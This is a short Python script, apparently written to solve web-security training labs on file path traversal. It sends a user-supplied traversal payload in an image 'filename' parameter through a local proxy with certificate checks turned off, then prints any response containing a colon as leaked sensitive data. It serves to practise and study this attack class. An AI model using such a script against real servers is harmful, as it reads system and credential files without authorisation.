#Lab: File path traversal, simple case
#Lab: File path traversal, traversal sequences blocked with absolute path bypass
#Lab: File path traversal, traversal sequences stripped non-recursively
#Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
#Lab: File path traversal, validation of start of path
#Lab: File path traversal, validation of file extension with null byte bypass

import requests
import sys
from requests.models import Response
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
def main():
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print("[-] Usage python3 %s <url> <payload>"%sys.argv[0])
        sys.exit()
    exploit(url,payload)

def exploit(url,payload):
    fuzz=url+"image?filename="+payload
    print("[+] Fuzzing with Follwing request : ")
    print(fuzz)
    r=requests.get(fuzz,proxies=proxies,verify=False)
    data=r.text
    '''
    soup=BeautifulSoup(r.text,'html.parser')
    data=soup.findAll(text=re.compile('.*:*.'))
    '''
    if  ':' in data:
        print('[+] Found Sensitive Data : ')
        print(data)
    else:
        print("[-] Not able to find sensitive Data")
if __name__=="__main__":
    main()